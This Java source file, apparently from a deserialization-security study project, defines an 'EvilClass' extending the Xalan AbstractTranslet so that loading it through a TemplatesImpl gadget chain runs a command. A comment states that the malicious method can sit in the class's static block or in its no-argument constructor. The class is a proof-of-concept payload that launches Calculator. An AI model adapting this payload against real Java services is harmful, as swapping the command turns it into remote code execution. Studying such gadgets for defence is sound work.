package org.su18.serialize.test;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

/**
 * 在 static 语句块中执行恶意方法的类
 * 在 无参 public 构造方法中也行
 *
 * @author su18
 */
public class EvilClass extends AbstractTranslet {

	static {
		try {
			Runtime.getRuntime().exec("open -a Calculator.app");
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	@Override
	public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

	}

	@Override
	public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

	}
}